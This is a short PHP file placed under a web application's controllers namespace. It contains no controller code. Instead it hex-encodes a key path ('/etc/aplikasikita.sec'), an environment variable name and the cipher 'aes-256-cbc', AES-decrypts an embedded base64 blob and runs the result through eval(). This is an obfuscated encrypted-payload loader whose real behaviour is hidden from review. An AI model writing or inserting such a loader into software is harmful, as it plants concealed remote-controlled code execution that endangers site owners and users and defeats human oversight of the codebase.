<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('1qhLIZCJ/zhJvd7y4pmJoA==');

$c=base64_decode(

'3qJOolaC0K3g8M+dVWYBKZmVRd7g027Ngr3iHmIzO50vumi9hEkD/LvzI2SzW7O0YP3uNZlM7NWx' .
'2dJCSvZRMGZXi4Ug7PvKEbFjY0oUe51iKvoc2g3QiOL5TA2ESlJnz18QzmhE4rYTjXq6B4gFx8z7' .
'e8SC9ahPPGU8w8Li+SlTFfc5K+eA7yNWorVRmobdMrwYrB7YWzXOtq9Q+cI3f5SMusVPvZuiSZx/' .
'GzcdrUTJxwZVwo7X1Bgbiz1FiXdPsiVXxS3YRselXXzaABxcvw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

